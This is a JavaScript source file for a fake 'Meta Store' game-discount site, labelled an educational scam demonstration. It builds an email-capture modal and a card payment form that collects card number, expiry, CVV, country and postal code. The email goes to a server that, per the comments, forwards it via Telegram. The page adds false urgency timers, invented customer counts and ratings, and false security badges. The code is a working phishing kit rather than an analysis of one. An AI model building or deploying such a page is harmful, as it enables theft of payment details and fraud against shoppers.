        return isValid;
    }
    
    // Fallback to legacy patterns for backward compatibility
    console.log('📮 Using legacy fallback validation patterns');
    
    const legacyZipPatterns = {
        'US': /^\d{5}(-\d{4})?$/,
        'CA': /^[A-Za-z]\d[A-Za-z] \d[A-Za-z]\d$/,
        'GB': /^[A-Z]{1,2}\d[A-Z\d]? \d[A-Z]{2}$/,
        'DE': /^\d{5}$/,
        'FR': /^\d{5}$/,
        'default': /^.{3,10}$/
    };
    
    const pattern = legacyZipPatterns[country] || legacyZipPatterns['default'];
    const isValid = pattern.test(zipCode);
    
    console.log(`📮 Legacy validation result: ${isValid ? '✅' : '❌'}`);
    return isValid;
}

// ====================================================================
// ZIP CODE PLACEHOLDER AND LABEL UPDATES
// ====================================================================
function updateZipCodePlaceholder(countryCode) {
    const zipInput = document.getElementById('zipCode');
    const zipLabel = document.querySelector('label[for="zipCode"]');
    
    if (!zipInput) return;
    
    const pattern = getZipCodePattern(countryCode);
    
    // Update placeholder
    zipInput.placeholder = pattern.placeholder;
    
    // Update label with format example
    if (zipLabel) {
        zipLabel.innerHTML = `Zip Code * <small style="color: #666; font-weight: normal;">(${pattern.example})</small>`;
    }
    
    // Clear previous validation state when country changes
    zipInput.classList.remove('error');
    clearFieldError('zipCode');
    
    // Reset validation state
    if (typeof formValidationState !== 'undefined') {
        formValidationState.zipCode = false;
        if (typeof updateSubmitButtonState === 'function') {
            updateSubmitButtonState();
        }
    }
    
    console.log(`📋 Updated zip code format for ${countryCode}:`, pattern.example);
}

// ====================================================================
// REAL-TIME ZIP CODE FORMATTING
// ====================================================================
function formatZipCodeInput(zipCode, countryCode) {
    if (!zipCode || !countryCode) return zipCode;
    
    const cleanZip = zipCode.replace(/[^\w\s]/g, '').toUpperCase();
    
    switch (countryCode) {
        case 'CA':
            // Format: L1L 1L1
            if (cleanZip.length <= 6) {
                return cleanZip.replace(/^([A-Z]\d[A-Z])(\d[A-Z]\d)$/, '$1 $2');
            }
            break;
            
        case 'GB':
            // Format: SW1A 1AA
            if (cleanZip.length > 3 && cleanZip.length <= 7) {
                const match = cleanZip.match(/^([A-Z]{1,2}\d[A-Z\d]?)(\d[A-Z]{2})$/);
                if (match) {
                    return `${match[1]} ${match[2]}`;
                }
            }
            break;
            
        case 'NL':
            // Format: 1234 AB
            if (cleanZip.length > 4) {
                return cleanZip.replace(/^(\d{4})([A-Z]{2})$/, '$1 $2');
            }
            break;
            
        case 'SE':
        case 'CZ':
        case 'SK':
            // Format: 123 45
            if (cleanZip.length > 3) {
                return cleanZip.replace(/^(\d{3})(\d{2})$/, '$1 $2');
            }
            break;
            
        case 'PL':
            // Format: 12-345
            if (cleanZip.length > 2) {
                return cleanZip.replace(/^(\d{2})(\d{3})$/, '$1-$2');
            }
            break;
            
        case 'JP':
            // Format: 123-4567
            if (cleanZip.length > 3) {
                return cleanZip.replace(/^(\d{3})(\d{4})$/, '$1-$2');
            }
            break;
            
        case 'BR':
            // Format: 12345-678
            if (cleanZip.length > 5) {
                return cleanZip.replace(/^(\d{5})(\d{3})$/, '$1-$2');
            }
            break;
    }
    
    return cleanZip;
}

// ====================================================================
// ZIP CODE ERROR MESSAGE GENERATION
// ====================================================================
function getZipCodeErrorMessage(countryCode) {
    const pattern = getZipCodePattern(countryCode);
    return `Please enter a valid zip code (${pattern.example})`;
}

// ====================================================================
// FORM VALIDATION HELPERS
// ====================================================================

// Show field error message
function showFieldError(fieldId, message) {
    const field = document.getElementById(fieldId);
    const errorElement = document.getElementById(fieldId + 'Error');
    
    if (field) field.classList.add('error');
    if (errorElement) {
        errorElement.textContent = message;
        errorElement.classList.add('show');
    }
}

// Clear field error message
function clearFieldError(fieldId) {
    const field = document.getElementById(fieldId);
    const errorElement = document.getElementById(fieldId + 'Error');
    
    if (field) field.classList.remove('error');
    if (errorElement) {
        errorElement.classList.remove('show');
    }
}

// Update submit button state based on validation
function updateSubmitButtonState() {
    const submitButton = document.getElementById('submitPayment');
    if (!submitButton) return; // Safety check
    
    const allValid = Object.values(formValidationState).every(valid => valid);
    
    if (allValid) {
        submitButton.disabled = false;
        submitButton.style.opacity = '1';
        submitButton.style.cursor = 'pointer';
        submitButton.style.background = 'linear-gradient(45deg, #27ae60, #2ecc71)';
        console.log('✅ Submit button enabled - all fields valid');
    } else {
        submitButton.disabled = true;
        submitButton.style.opacity = '0.6';
        submitButton.style.cursor = 'not-allowed';
        submitButton.style.background = '#95a5a6';
        console.log('⚠️ Submit button disabled - validation state:', formValidationState);
    }
}

// Get field-specific error messages
function getFieldErrorMessage(field) {
    const messages = {
        cardHolder: 'Please enter card holder full name',
        cardNumber: 'Please enter a valid card number',
        cardExpiry: 'Please enter valid expiry date (MM/YY)',
        cardCvv: 'Please enter valid CVV code',
        country: 'Please select your country',
        zipCode: 'Please enter valid zip code'
    };
    
    return messages[field] || 'This field is required';
}

// ====================================================================
// EMAIL VALIDATION
// ====================================================================
function validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// ====================================================================
// CARD VALIDATION FUNCTIONS
// ====================================================================

// Detect card type from number
function detectCardType(cardNumber) {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    
    for (const [type, config] of Object.entries(CARD_BINS)) {
        for (const bin of config.bins) {
            if (cleanNumber.startsWith(bin)) {
                return type;
            }
        }
    }
    
    return null;
}

// Update card type icon display
function updateCardTypeIcon(cardType) {
    const cardTypeIcon = document.getElementById('cardTypeIcon');
    
    if (!cardTypeIcon) return;
    
    cardTypeIcon.className = 'card-type-icon';
    if (cardType) {
        cardTypeIcon.classList.add(cardType);
    }
}

// Validate card number using Luhn algorithm and BIN ranges
function validateCardNumber(cardNumber, cardType) {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    
    if (!cardType || !cleanNumber) return false;
    
    // Check length
    const expectedLengths = CARD_BINS[cardType].lengths;
    if (!expectedLengths.includes(cleanNumber.length)) return false;
    
    // Luhn algorithm validation
    return luhnCheck(cleanNumber);
}

// Luhn algorithm implementation
function luhnCheck(cardNumber) {
    let sum = 0;
    let alternate = false;
    
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let n = parseInt(cardNumber.charAt(i), 10);
        
        if (alternate) {
            n *= 2;
            if (n > 9) {
                n = (n % 10) + 1;
            }
        }
        
        sum += n;
        alternate = !alternate;
    }
    
    return (sum % 10) === 0;
}

// Validate card expiry date
function validateCardExpiry(expiry) {
    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
    
    const [month, year] = expiry.split('/').map(n => parseInt(n, 10));
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;
    
    if (month < 1 || month > 12) return false;
    if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
    
    return true;
}

// Validate CVV code
function validateCVV(cvv, cardType) {
    const expectedLength = cardType === 'amex' ? 4 : 3;
    return cvv.length === expectedLength && /^\d+$/.test(cvv);
}

// ====================================================================
// COMPREHENSIVE FORM VALIDATION
// ====================================================================
function validateAllFields() {
    const cardHolder = document.getElementById('cardHolder')?.value.trim() || '';
    const cardNumber = document.getElementById('cardNumber')?.value.replace(/\s/g, '') || '';
    const cardExpiry = document.getElementById('cardExpiry')?.value || '';
    const cardCvv = document.getElementById('cardCvv')?.value || '';
    const country = document.getElementById('country')?.value || '';
    const zipCode = document.getElementById('zipCode')?.value.trim() || '';
    
    // Validate each field
    formValidationState.cardHolder = cardHolder.length >= 2;
    formValidationState.cardNumber = validateCardNumber(cardNumber, detectCardType(cardNumber));
    formValidationState.cardExpiry = validateCardExpiry(cardExpiry);
    formValidationState.cardCvv = validateCVV(cardCvv, detectCardType(cardNumber));
    formValidationState.country = country !== '';
    
    // ENHANCED: Country-specific zip code validation
    formValidationState.zipCode = validateZipCodeByCountry(zipCode, country);
    
    console.log('📋 Full form validation check:', formValidationState);
    console.log(`📮 Zip code "${zipCode}" for country "${country}": ${formValidationState.zipCode ? '✅ Valid' : '❌ Invalid'}`);
    
    return Object.values(formValidationState).every(valid => valid);
}

// ====================================================================
// TESTING FUNCTIONS (FOR EDUCATIONAL PURPOSES)
// ====================================================================

// Test zip code validation patterns
function testZipCodeValidation() {
    console.log('🧪 Testing Country-Specific Zip Code Validation:');
    
    const testCases = [
        { country: 'US', zip: '12345', expected: true },
        { country: 'US', zip: '12345-6789', expected: true },
        { country: 'US', zip: '123', expected: false },
        { country: 'GB', zip: 'SW1A 1AA', expected: true },
        { country: 'GB', zip: 'M1 1AA', expected: true },
        { country: 'GB', zip: '12345', expected: false },
        { country: 'CA', zip: 'K1A 0A6', expected: true },
        { country: 'CA', zip: 'K1A0A6', expected: true },
        { country: 'CA', zip: '12345', expected: false },
        { country: 'DE', zip: '12345', expected: true },
        { country: 'DE', zip: '123', expected: false },
        { country: 'NL', zip: '1234 AB', expected: true },
        { country: 'NL', zip: '1234AB', expected: true },
        { country: 'NL', zip: '12345', expected: false },
        { country: 'JP', zip: '123-4567', expected: true },
        { country: 'JP', zip: '1234567', expected: true },
        { country: 'MA', zip: '20000', expected: true },
        { country: 'MA', zip: '123', expected: false }
    ];
    
    testCases.forEach(test => {
        const result = validateZipCodeByCountry(test.zip, test.country);
        const status = result === test.expected ? '✅ PASS' : '❌ FAIL';
        console.log(`${status} ${test.country}: "${test.zip}" → ${result} (expected: ${test.expected})`);
    });
    
    console.log('🧪 Zip code validation testing complete');
}

// Test zip code formatting
function testZipCodeFormatting() {
    console.log('🎨 Testing Zip Code Auto-Formatting:');
    
    const formatTests = [
        { country: 'CA', input: 'k1a0a6', expected: 'K1A 0A6' },
        { country: 'GB', input: 'sw1a1aa', expected: 'SW1A 1AA' },
        { country: 'NL', input: '1234ab', expected: '1234 AB' },
        { country: 'JP', input: '1234567', expected: '123-4567' },
        { country: 'PL', input: '12345', expected: '12-345' },
        { country: 'SE', input: '12345', expected: '123 45' },
        { country: 'BR', input: '12345678', expected: '12345-678' }
    ];
    
    formatTests.forEach(test => {
        const result = formatZipCodeInput(test.input, test.country);
        const status = result === test.expected ? '✅ PASS' : '❌ FAIL';
        console.log(`${status} ${test.country}: "${test.input}" → "${result}" (expected: "${test.expected}")`);
    });
    
    console.log('🎨 Zip code formatting testing complete');
}

// Run validation tests in development
setTimeout(() => {
    if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
        testZipCodeValidation();
        testZipCodeFormatting();
    }
}, 3000);

// ====================================================================
// CONSOLE STATUS MESSAGE
// ====================================================================
console.log('🎯 SCRIPT.JS PART 4 LOADED: Zip Code Validation System');
console.log('📮 Loaded: Country-specific zip code validation for 50+ countries');
console.log('🎨 Loaded: Real-time zip code formatting and auto-correction');
console.log('✅ Loaded: Form validation helpers and error management');
console.log('💳 Loaded: Credit card validation (Luhn algorithm, BIN ranges)');
console.log('🧪 Loaded: Testing functions for validation and formatting');
console.log('✅ PART 4 COMPLETE - Ready for Part 5: Email Modal (Step 1)');

// ====================================================================
// SCRIPT.JS - PART 5: EMAIL MODAL (STEP 1) - UPDATED WITH SERVER INTEGRATION
// Educational Scam Demonstration - Fake Meta Store
// Purpose: Email collection modal, validation, and Step 1 processing via server
// ====================================================================

// ====================================================================
// STEP 1: SHOW EMAIL MODAL (UNCHANGED)
// ====================================================================
function showEmailModal(gameName, currentPrice, originalPrice) {
    console.log('📧 Showing email modal...');
    
    // Create email modal if it doesn't exist
    if (!document.getElementById('emailModal')) {
        createEmailModal();
    }
    
    const modal = document.getElementById('emailModal');
    const gameNameElement = document.getElementById('emailModalGameName');
    const gamePriceElement = document.getElementById('emailModalGamePrice');
    const originalPriceElement = document.getElementById('emailModalOriginalPrice');
    
    // Update modal content
    gameNameElement.textContent = gameName;
    gamePriceElement.textContent = `$${currentPrice}`;
    originalPriceElement.textContent = `$${originalPrice}`;
    
    // Show modal
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
    
    // Initialize email form
    initializeEmailForm();
}

// ====================================================================
// CREATE EMAIL MODAL HTML (UNCHANGED)
// ====================================================================
function createEmailModal() {
    const modalHTML = `
        <div class="modal-overlay" id="emailModal">
            <div class="email-modal">
                <div class="modal-header">
                    <button class="modal-close" id="closeEmailModal">
                        <i class="fas fa-times"></i>
                    </button>
                    <h2 class="modal-title">🎮 Claim Your Exclusive Deal!</h2>
                    <p class="modal-subtitle">Enter your email to secure this limited-time offer</p>
                </div>
                <div class="modal-content">
                    <div class="email-offer-summary">
                        <div class="game-preview">
                            <h3 id="emailModalGameName">Game Name</h3>
                            <div class="price-display">
                                <span class="price-original" id="emailModalOriginalPrice">$0.00</span>
                                <span class="price-current" id="emailModalGamePrice">$0.00</span>
                                <span class="discount-badge">83% OFF</span>
                            </div>
                        </div>
                        
                        <div class="urgency-message">
                            <i class="fas fa-clock"></i>
                            <span>⚡ This deal expires in <strong id="emailCountdown">3 days</strong></span>
                        </div>
                        
                        <div class="benefits-list">
                            <div class="benefit-item">
                                <i class="fas fa-download"></i>
                                <span>Instant Gift Code</span>
                            </div>
                            <div class="benefit-item">
                                <i class="fas fa-shield-alt"></i>
                                <span>100% Secure</span>
                            </div>
                            <div class="benefit-item">
                                <i class="fas fa-gift"></i>
                                <span>Exclusive Discount</span>
                            </div>
                        </div>
                    </div>
                    
                    <form class="email-form" id="emailForm">
                        <div class="form-group">
                            <label for="userEmail">Email Address *</label>
                            <input type="email" id="userEmail" name="userEmail" placeholder="your@email.com" required>
                            <div class="email-note">
                                <i class="fas fa-info-circle"></i>
                                <span>We'll send your gift code and receipt to this email</span>
                            </div>
                        </div>
                        
                        <div class="trust-indicators">
                            <div class="trust-item">
                                <i class="fas fa-users"></i>
                                <span><strong>50,000+</strong> satisfied customers</span>
                            </div>
                            <div class="trust-item">
                                <i class="fas fa-star"></i>
                                <span><strong>4.8/5</strong> average rating</span>
                            </div>
                        </div>
                        
                        <button type="submit" class="continue-btn" id="continueToPayment">
                            <i class="fas fa-arrow-right"></i>
                            Continue to Secure Checkout
                        </button>
                        
                        <div class="security-note">
                            <i class="fas fa-lock"></i>
                            <span>Your information is protected by 256-bit SSL encryption</span>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', modalHTML);
    
    // Add close functionality
    document.getElementById('closeEmailModal').addEventListener('click', closeEmailModal);
    document.getElementById('emailModal').addEventListener('click', function(e) {
        if (e.target === this) {
            closeEmailModal();
        }
    });
}

// ====================================================================
// INITIALIZE EMAIL FORM VALIDATION AND SUBMISSION (UPDATED)
// ====================================================================
function initializeEmailForm() {
    const form = document.getElementById('emailForm');
    const emailInput = document.getElementById('userEmail');
    const submitButton = document.getElementById('continueToPayment');
    
    // Initialize submit button as disabled
    submitButton.disabled = true;
    submitButton.style.opacity = '0.6';
    submitButton.style.cursor = 'not-allowed';
    submitButton.style.background = '#95a5a6';
    
    // Email validation with real-time button state
    emailInput.addEventListener('input', function() {
        const email = this.value.trim();
        const isValid = validateEmail(email);
        
        if (email.length > 0) {
            if (isValid) {
                this.classList.remove('error');
                // Enable submit button
                submitButton.disabled = false;
                submitButton.style.opacity = '1';
                submitButton.style.cursor = 'pointer';
                submitButton.style.background = 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
            } else {
                this.classList.add('error');
                // Disable submit button
                submitButton.disabled = true;
                submitButton.style.opacity = '0.6';
                submitButton.style.cursor = 'not-allowed';
                submitButton.style.background = '#95a5a6';
            }
        } else {
            this.classList.remove('error');
            // Disable submit button for empty field
            submitButton.disabled = true;
            submitButton.style.opacity = '0.6';
            submitButton.style.cursor = 'not-allowed';
            submitButton.style.background = '#95a5a6';
        }
    });
    
    // UPDATED: Enhanced form submission with server integration
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        
        console.log('📧 Email form submission attempted with:', email);
        
        // Comprehensive email validation
        if (!email || email.length === 0) {
            console.log('⏰ Email is empty');
            emailInput.classList.add('error');
            showNotification('⏰ Please enter your email address', 'error');
            return false;
        }
        
        if (!validateEmail(email)) {
            console.log('⏰ Email validation failed');
            emailInput.classList.add('error');
            showNotification('⏰ Please enter a valid email address', 'error');
            return false;
        }
        
        console.log('✅ Email validation passed');
        
        // Store email globally
        userPaymentData.email = email;
        
        // Show processing state
        showEmailProcessing(submitButton);
        
        try {
            // UPDATED: Send email data to server (which handles location lookup and Telegram)
            const result = await sendEmailToServer(email, userPaymentData.gameName, userPaymentData.currentPrice);
            
            console.log('✅ Server response:', result);
            
            // Update location data if received from server
            if (result.locationData) {
                userLocationData = { ...userLocationData, ...result.locationData };
                userPaymentData.locationData = userLocationData;
                console.log('📍 Location data updated from server:', userLocationData);
            }
            
            // Simulate processing delay for realistic UX
            setTimeout(() => {
                // Close email modal and show full payment modal
                closeEmailModal();
                
                // Small delay for better UX
                setTimeout(() => {
                    showFullPaymentModal();
                }, 300);
            }, 1500); // 1.5 seconds for realistic processing
            
        } catch (error) {
            console.error('❌ Server error:', error);
            
            // Reset button and show error
            resetEmailButton(submitButton);
            showNotification('❌ Server error. Please try again.', 'error');
        }
    });
}

// ====================================================================
// EMAIL PROCESSING ANIMATION (UPDATED)
// ====================================================================
function showEmailProcessing(submitButton) {
    const originalText = submitButton.innerHTML;
    
    // Show processing state
    submitButton.innerHTML = '<div class="spinner"></div> Connecting to Server...';
    submitButton.disabled = true;
    submitButton.style.opacity = '0.8';
    submitButton.style.cursor = 'not-allowed';
    
    // Add processing class for additional styling
    submitButton.classList.add('processing');
    
    console.log('📧 Email processing started...');
    
    // Update processing message after 1 second
    setTimeout(() => {
        if (submitButton.classList.contains('processing')) {
            submitButton.innerHTML = '<div class="spinner"></div> Verifying Email...';
        }
    }, 1000);
}

// ====================================================================
// RESET EMAIL BUTTON (NEW)
// ====================================================================
function resetEmailButton(submitButton) {
    submitButton.disabled = false;
    submitButton.style.opacity = '1';
    submitButton.style.cursor = 'pointer';
    submitButton.style.background = 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
    submitButton.classList.remove('processing');
    submitButton.innerHTML = '<i class="fas fa-arrow-right"></i> Continue to Secure Checkout';
    
    console.log('🔄 Email button reset to normal state');
}

// ====================================================================
// CLOSE EMAIL MODAL (UNCHANGED)
// ====================================================================
function closeEmailModal() {
    const modal = document.getElementById('emailModal');
    if (modal) {
        modal.classList.remove('active');
        document.body.style.overflow = '';
        
        // Reset form if it exists
        const form = document.getElementById('emailForm');
        if (form) {
            form.reset();
        }
        
        // Remove error states
        const errorInputs = document.querySelectorAll('.error');
        errorInputs.forEach(input => input.classList.remove('error'));
        
        // Reset submit button state
        const submitButton = document.getElementById('continueToPayment');
        if (submitButton) {
            submitButton.disabled = true;
            submitButton.style.opacity = '0.6';
            submitButton.style.cursor = 'not-allowed';
            submitButton.style.background = '#95a5a6';
            submitButton.classList.remove('processing');
            submitButton.innerHTML = '<i class="fas fa-arrow-right"></i> Continue to Secure Checkout';
        }
        
        console.log('📧 Email modal closed and reset');
    }
}

// ====================================================================
// EMAIL COUNTDOWN TIMER (UNCHANGED)
// ====================================================================
function initializeEmailCountdown() {
    const countdownElement = document.getElementById('emailCountdown');
    
    if (!countdownElement) return;
    
    let days = 2;
    let hours = 23;
    let minutes = 47;
    
    function updateEmailCountdown() {
        minutes--;
        
        if (minutes < 0) {
            minutes = 59;
            hours--;
            
            if (hours < 0) {
                hours = 23;
                days--;
                
                if (days < 0) {
                    days = 2;
                    hours = 23;
                    minutes = 47;
                }
            }
        }
        
        if (days > 0) {
            countdownElement.textContent = `${days} days`;
        } else if (hours > 0) {
            countdownElement.textContent = `${hours} hours`;
        } else {
            countdownElement.textContent = `${minutes} minutes`;
            countdownElement.style.color = '#e74c3c';
            countdownElement.style.fontWeight = 'bold';
        }
    }
    
    // Start countdown when email modal is shown
    const emailModal = document.getElementById('emailModal');
    if (emailModal) {
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
                    if (emailModal.classList.contains('active')) {
                        updateEmailCountdown();
                        const intervalId = setInterval(updateEmailCountdown, 60000); // Update every minute
                        
                        // Stop countdown when modal is closed
                        const stopObserver = new MutationObserver(function(stopMutations) {
                            stopMutations.forEach(function(stopMutation) {
                                if (!emailModal.classList.contains('active')) {
                                    clearInterval(intervalId);
                                    stopObserver.disconnect();
                                }
                            });
                        });
                        
                        stopObserver.observe(emailModal, { attributes: true, attributeFilter: ['class'] });
                    }
                }
            });
        });
        
        observer.observe(emailModal, { attributes: true, attributeFilter: ['class'] });
    }
}

// ====================================================================
// NOTIFICATION SYSTEM FOR EMAIL STEP (UNCHANGED)
// ====================================================================
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 1rem 1.5rem;
        border-radius: 8px;
        color: white;
        font-weight: 600;
        z-index: 1001;
        max-width: 350px;
        white-space: pre-line;
        animation: slideIn 0.3s ease;
        box-shadow: 0 6px 25px rgba(0,0,0,0.4);
        border-left: 4px solid rgba(255,255,255,0.3);
    `;
    
    const colors = {
        'success': '#27ae60',
        'error': '#e74c3c',
        'info': '#0866ff',
        'warning': '#f39c12'
    };
    
    notification.style.background = colors[type] || colors['info'];
    notification.textContent = message;
    
    // Add animation keyframes if not exists
    if (!document.querySelector('#notification-styles')) {
        const style = document.createElement('style');
        style.id = 'notification-styles';
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            @keyframes slideOut {
                from { transform: translateX(0); opacity: 1; }
                to { transform: translateX(100%); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    }
    
    document.body.appendChild(notification);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => {
            if (document.body.contains(notification)) {
                document.body.removeChild(notification);
            }
        }, 300);
    }, 5000);
    
    // Click to dismiss
    notification.addEventListener('click', function() {
        this.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => {
            if (document.body.contains(this)) {
                document.body.removeChild(this);
            }
        }, 300);
    });
}

// ====================================================================
// EMAIL STEP ANALYTICS (UNCHANGED)
// ====================================================================
function trackEmailStep(email) {
    const emailStepData = {
        step: 'Email Collection',
        email: email,
        timestamp: new Date().toISOString(),
        timeOnPage: performance.now(),
        userAgent: navigator.userAgent,
        locationData: userLocationData,
        gameData: {
            name: userPaymentData.gameName,
            price: userPaymentData.currentPrice,
            originalPrice: userPaymentData.originalPrice
        }
    };
    
    console.log('📊 Email Step Analytics (Educational Demo):', emailStepData);
    
    // This demonstrates how scammers track user behavior at each step
    return emailStepData;
}

// ====================================================================
// EMAIL VALIDATION ENHANCEMENT (UNCHANGED)
// ====================================================================
function enhancedEmailValidation(email) {
    // Basic email validation
    if (!validateEmail(email)) {
        return { valid: false, reason: 'Invalid email format' };
    }
    
    // Additional checks that scammers might use
    const commonDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com'];
    const domain = email.split('@')[1];
    
    // Check for suspicious patterns (educational purposes)
    if (email.includes('test') || email.includes('fake') || email.includes('example')) {
        console.log('⚠️ Potentially test email detected:', email);
    }
    
    if (commonDomains.includes(domain)) {
        console.log('✅ Common email domain detected:', domain);
    } else {
        console.log('🔍 Custom email domain:', domain);
    }
    
    return { valid: true, domain: domain, isCommon: commonDomains.includes(domain) };
}

// ====================================================================
// EMAIL STEP SUCCESS TRACKING (UPDATED)
// ====================================================================
function trackEmailSuccess() {
    console.log('🎯 EMAIL STEP COMPLETED SUCCESSFULLY');
    console.log('📧 Email collected:', userPaymentData.email);
    console.log('🎮 Game selected:', userPaymentData.gameName);
    console.log('💰 Price point:', userPaymentData.currentPrice);
    console.log('🌍 User location:', userLocationData.country_name, userLocationData.city);
    console.log('⏰ Time to email completion:', performance.now(), 'ms');
    console.log('📡 Data sent to server for processing');
    console.log('🔄 Proceeding to Step 2: Payment Information');
}

// ====================================================================
// INITIALIZE EMAIL STEP FEATURES (UNCHANGED)
// ====================================================================
// Auto-initialize email countdown when script loads
setTimeout(() => {
    initializeEmailCountdown();
}, 1000);

// ====================================================================
// CONSOLE STATUS MESSAGE
// ====================================================================
console.log('🎯 SCRIPT.JS PART 5 LOADED: Email Modal (Step 1) - Server Integration');
console.log('📧 Loaded: Email modal creation and display system');
console.log('✅ Loaded: Email form validation with real-time feedback');
console.log('🎨 Loaded: Email processing animation with server communication');
console.log('⏰ Loaded: Email countdown timer for urgency');
console.log('📊 Loaded: Email step analytics and tracking');
console.log('🔔 Loaded: Notification system for user feedback');
console.log('📡 UPDATED: Server integration for secure data handling');
console.log('🔒 SECURE: All tokens and API calls moved to server-side');
console.log('✅ PART 5 COMPLETE - Ready for Part 6: Payment Modal (Step 2)');

// ====================================================================
// SCRIPT.JS - PART 6: PAYMENT MODAL (STEP 2) - UPDATED WITH SERVER INTEGRATION
// Educational Scam Demonstration - Fake Meta Store
// Purpose: Payment modal creation, form validation, and server-side processing
// ====================================================================

// ====================================================================
// STEP 2: SHOW FULL PAYMENT MODAL (UNCHANGED)
// ====================================================================
function showFullPaymentModal() {
    // Create payment modal if it doesn't exist
    if (!document.getElementById('paymentModal')) {
        createPaymentModal();
    }
    
    const modal = document.getElementById('paymentModal');
    const gameNameElement = document.getElementById('modalGameName');
    const gamePriceElement = document.getElementById('modalGamePrice');
    const originalPriceElement = document.getElementById('modalOriginalPrice');
    const totalPriceElement = document.getElementById('modalTotalPrice');
    const userEmailElement = document.getElementById('modalUserEmail');
    
    // Update modal content
    gameNameElement.textContent = userPaymentData.gameName;
    gamePriceElement.textContent = `$${userPaymentData.currentPrice}`;
    originalPriceElement.textContent = `$${userPaymentData.originalPrice}`;
    totalPriceElement.textContent = `$${userPaymentData.currentPrice}`;
    userEmailElement.textContent = userPaymentData.email;
    
    // Show modal
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
    
    // Initialize payment form with enhanced country functionality
    initializePaymentForm();
}

// ====================================================================
// CREATE PAYMENT MODAL HTML (UNCHANGED)
// ====================================================================
function createPaymentModal() {
    const modalHTML = `
        <div class="modal-overlay" id="paymentModal">
            <div class="payment-modal">
                <div class="modal-header">
                    <button class="modal-close" id="closeModal">
                        <i class="fas fa-times"></i>
                    </button>
                    <h2 class="modal-title">💳 Secure Payment</h2>
                    <p class="modal-subtitle">Complete your purchase - Your game will be available instantly</p>
                </div>
                <div class="modal-content" id="modalContent">
                    <div class="order-summary">
                        <h3>Order Summary</h3>
                        <div class="email-confirmation">
                            <i class="fas fa-envelope"></i>
                            <span>Sending receipt to: <strong id="modalUserEmail">email@example.com</strong></span>
                        </div>
                        <div class="order-item">
                            <span class="item-name" id="modalGameName">Game Name</span>
                            <span class="item-price" id="modalGamePrice">$0.00</span>
                        </div>
                        <div class="order-item">
                            <span class="item-name">Original Price:</span>
                            <span class="item-price" style="text-decoration: line-through; color: #999;" id="modalOriginalPrice">$0.00</span>
                        </div>
                        <div class="order-item">
                            <span class="item-name">Total:</span>
                            <span class="item-price" id="modalTotalPrice">$0.00</span>
                        </div>
                    </div>
                    
                    <form class="payment-form" id="paymentForm">
                        <div class="form-group">
                            <label for="cardHolder">Card Holder Full Name *</label>
                            <input type="text" id="cardHolder" name="cardHolder" required>
                            <div class="error-message" id="cardHolderError">Please enter card holder name</div>
                        </div>
                        
                        <div class="form-group">
                            <label for="cardNumber">Card Number *</label>
                            <div class="card-input-container">
                                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required maxlength="19">
                                <div class="card-type-icon" id="cardTypeIcon"></div>
                            </div>
                            <div class="error-message" id="cardError">Please enter a valid card number</div>
                        </div>
                        
                        <div class="form-row">
                            <div class="form-group">
                                <label for="cardExpiry">Card Expiry *</label>
                                <input type="text" id="cardExpiry" name="cardExpiry" placeholder="MM/YY" required maxlength="5">
                                <div class="error-message" id="expiryError">Please enter valid expiry date</div>
                            </div>
                            <div class="form-group">
                                <label for="cardCvv">CVV *</label>
                                <input type="text" id="cardCvv" name="cardCvv" placeholder="123" required maxlength="4">
                                <div class="error-message" id="cvvError">Please enter valid CVV</div>
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label for="country" id="countryLabel">Country *</label>
                            <select id="country" name="country" required>
                                <option value="">-- Loading Countries --</option>
                            </select>
                            <div class="error-message" id="countryError">Please select your country</div>
                        </div>
                        
                        <div class="form-group">
                            <label for="zipCode" id="zipCodeLabel">Zip Code * <small style="color: #666; font-weight: normal;">(Enter valid postal code)</small></label>
                            <input type="text" id="zipCode" name="zipCode" placeholder="Enter zip code" required>
                            <div class="error-message" id="zipError">Please enter valid zip code</div>
                        </div>
                        
                        <div class="security-badges">
                            <div class="security-badge">
                                <i class="fas fa-shield-alt"></i>
                                <span>SSL Encrypted</span>
                            </div>
                            <div class="security-badge">
                                <i class="fas fa-lock"></i>
                                <span>100% Secure</span>
                            </div>
                            <div class="security-badge">
                                <i class="fas fa-credit-card"></i>
                                <span>Safe Payment</span>
                            </div>
                        </div>
                        
                        <button type="submit" class="submit-btn" id="submitPayment" disabled>
                            <i class="fas fa-credit-card"></i>
                            Complete Purchase
                        </button>
                    </form>
                </div>
            </div>
        </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', modalHTML);
    
    // Add close functionality
    document.getElementById('closeModal').addEventListener('click', closePaymentModal);
    document.getElementById('paymentModal').addEventListener('click', function(e) {
        if (e.target === this) {
            closePaymentModal();
        }
    });
}

// ====================================================================
// INITIALIZE PAYMENT FORM (UPDATED WITH SERVER INTEGRATION)
// ====================================================================
function initializePaymentForm() {
    const form = document.getElementById('paymentForm');
